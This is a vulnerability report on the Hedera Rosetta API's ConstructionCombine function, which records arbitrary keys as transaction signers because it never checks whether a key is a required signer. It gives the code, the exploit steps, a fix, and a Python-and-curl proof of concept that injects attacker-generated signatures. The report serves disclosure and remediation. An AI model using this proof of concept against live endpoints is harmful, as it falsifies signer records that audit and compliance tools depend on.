### Title
Unrestricted Signature Injection in `ConstructionCombine` Allows Arbitrary Keys to Be Recorded as Transaction Signers

### Summary
`ConstructionCombine` validates only that each supplied signature is a cryptographically valid Ed25519 signature over `frozenBodyBytes`, but never checks whether the signing public key belongs to a required signer of the transaction. An unprivileged caller can generate arbitrary key pairs, sign the same `frozenBodyBytes`, and inject those signatures into the transaction. Because the Hedera network accepts extra signatures silently, the transaction executes normally while the mirror node records a `sigMap` containing keys that were never required, producing permanently incorrect signer records.

### Finding Description
**Exact code path:** `rosetta/app/services/construction_service.go`, `ConstructionCombine()`, lines 72–87.

```go
for _, signature := range request.Signatures {
    if signature.SignatureType != rTypes.Ed25519 {
        return nil, errors.ErrInvalidSignatureType
    }
    pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
    if err != nil {
        return nil, errors.ErrInvalidPublicKey
    }
    if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {
        return nil, errors.ErrInvalidSignatureVerification
    }
    _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
}
```

**Root cause / failed assumption:** The function assumes that any signature that cryptographically verifies against `frozenBodyBytes` must belong to a legitimate required signer. There is no whitelist of required public keys derived from the transaction body (payer, sender, receiver, etc.) against which incoming keys are checked. The three guards in place — type check (line 73), key parse check (line 77–79), and `ed25519.Verify` (line 82–84) — are all purely cryptographic and say nothing about *authorization*.

**Exploit flow:**
1. Attacker obtains `frozenBodyBytes` from any `UnsignedTransaction` hex string (e.g., by calling `ConstructionPayloads` themselves or by observing a legitimate unsigned transaction in transit).
2. Attacker generates N arbitrary Ed25519 key pairs offline.
3. For each key pair, attacker signs `frozenBodyBytes` → produces a valid `(pubKey_i, sig_i)` pair.
4. Attacker calls `POST /construction/combine` with `UnsignedTransaction` = the target transaction and `Signatures` = the N attacker-controlled pairs (optionally including the legitimate signer's pair).
5. Every pair passes `ed25519.Verify` because the signatures are genuinely valid over `frozenBodyBytes`.
6. `TransactionAddSignature` is called for each pair, embedding all N public keys and signatures into the transaction's `sigMap`.
7. The resulting `SignedTransaction` is returned and can be submitted via `ConstructionSubmit`.
8. The Hedera consensus node accepts the transaction (extra signatures are not rejected by the protocol).
9. The mirror node ingests the transaction record and persists every `sigPair` in the `sigMap` to `transaction_signature`, recording the attacker's arbitrary keys as signatories.

**Why existing checks are insufficient:** The only validation is `ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes)` — this confirms the attacker correctly signed the bytes with their own key, which is trivially achievable. There is no cross-reference to the set of accounts/keys that the transaction constructor (`transactionHandler.Construct` / `Preprocess`) determined were required signers during `ConstructionPayloads`.

### Impact Explanation
The mirror node's `transaction_signature` table receives rows for public keys that had no legitimate role in the transaction. Any downstream consumer of mirror node data — compliance tools, audit systems, block explorers, exchange reconciliation pipelines — will see a falsified signer set. For a `TransferTransaction`, this means accounts that never authorized the transfer appear as signatories. The data corruption is permanent (consensus records are immutable once ingested). Severity is **Medium**: transaction execution semantics on the consensus layer are unaffected, but the mirror node's exported records are incorrect, which is the exact scope called out in the finding.

### Likelihood Explanation
The attack requires no privileges, no account on the Hedera network, and no secret material beyond the `frozenBodyBytes` (which is public once the unsigned transaction is known). Generating Ed25519 key pairs and signing bytes is a standard cryptographic operation available in any language. The endpoint is unauthenticated by design (Rosetta is a public API). Any party who can reach the `/construction/combine` endpoint — including the legitimate transaction initiator, a relay operator, or a network observer — can perform this injection. It is repeatable on every transaction.

### Recommendation
After parsing the transaction and extracting `frozenBodyBytes`, derive the set of required signer public keys from the transaction body (payer account key, sender/receiver keys as applicable) and build an allowlist. In the signature loop, reject any `signature.PublicKey` that is not in that allowlist before calling `TransactionAddSignature`. Concretely:

1. Call `transactionHandler.Parse` (or an equivalent) on the frozen transaction to obtain the canonical `signers` slice.
2. Resolve each signer account's public key(s) from the account repository.
3. In the loop, after `ed25519.Verify` passes, check `pubKey ∈ allowedKeys`; return `ErrInvalidPublicKey` (or a new `ErrUnauthorizedSigner` error) if not.
4. Additionally enforce `len(request.Signatures) <= len(requiredSigners)` as a cheap early guard.

### Proof of Concept
```
# 1. Obtain an unsigned transaction hex (e.g., from /construction/payloads for a transfer)
UNSIGNED_TX="<hex from ConstructionPayloads>"

# 2. Decode frozenBodyBytes from the unsigned transaction
#    (parse the SignedTransaction proto, extract body_bytes)

# 3. Generate 3 arbitrary Ed25519 key pairs and sign frozenBodyBytes with each
python3 - <<'EOF'
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
import binascii, base64

body_bytes = bytes.fromhex("<frozenBodyBytes hex>")
sigs = []
for _ in range(3):
    priv = Ed25519PrivateKey.generate()
    pub  = priv.public_key()
    sig  = priv.sign(body_bytes)
    pub_bytes = pub.public_bytes_raw()
    sigs.append({"pub": pub_bytes.hex(), "sig": sig.hex()})
    print(f"pub={pub_bytes.hex()} sig={sig.hex()}")
EOF

# 4. POST to /construction/combine with the 3 attacker signatures
curl -X POST http://<rosetta-host>/construction/combine \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Hedera","network":"testnet"},
    "unsigned_transaction": "'$UNSIGNED_TX'",
    "signatures": [
      {"signing_payload":{"bytes":"<frozenBodyBytes hex>","signature_type":"ed25519"},
       "public_key":{"hex_bytes":"<pub1>","curve_type":"edwards25519"},
       "signature_type":"ed25519","bytes":"<sig1>"},
      {"signing_payload":{"bytes":"<frozenBodyBytes hex>","signature_type":"ed25519"},
       "public_key":{"hex_bytes":"<pub2>","curve_type":"edwards25519"},
       "signature_type":"ed25519","bytes":"<sig2>"},
      {"signing_payload":{"bytes":"<frozenBodyBytes hex>","signature_type":"ed25519"},
       "public_key":{"hex_bytes":"<pub3>","curve_type":"edwards25519"},
       "signature_type":"ed25519","bytes":"<sig3>"}
    ]
  }'

# 5. Submit the returned signed_transaction via /construction/submit
# 6. Query the mirror node REST API for the transaction's signatures:
#    GET /api/v1/transactions/<txId>
#    -> response will list all 3 attacker public keys as signatories
``` [1](#0-0) [2](#0-1)

### Citations

**File:** rosetta/app/services/construction_service.go (L54-97)
```go
func (c *constructionAPIService) ConstructionCombine(
	_ context.Context,
	request *rTypes.ConstructionCombineRequest,
) (*rTypes.ConstructionCombineResponse, *rTypes.Error) {
	if len(request.Signatures) == 0 {
		return nil, errors.ErrNoSignature
	}

	transaction, rErr := unmarshallTransactionFromHexString(request.UnsignedTransaction)
	if rErr != nil {
		return nil, rErr
	}

	frozenBodyBytes, rErr := getFrozenTransactionBodyBytes(transaction)
	if rErr != nil {
		return nil, rErr
	}

	for _, signature := range request.Signatures {
		if signature.SignatureType != rTypes.Ed25519 {
			return nil, errors.ErrInvalidSignatureType
		}

		pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
		if err != nil {
			return nil, errors.ErrInvalidPublicKey
		}

		if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {
			return nil, errors.ErrInvalidSignatureVerification
		}

		_, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
	}

	transactionBytes, err := hiero.TransactionToBytes(transaction)
	if err != nil {
		return nil, errors.ErrTransactionMarshallingFailed
	}

	return &rTypes.ConstructionCombineResponse{
		SignedTransaction: tools.SafeAddHexPrefix(hex.EncodeToString(transactionBytes)),
	}, nil
}
```
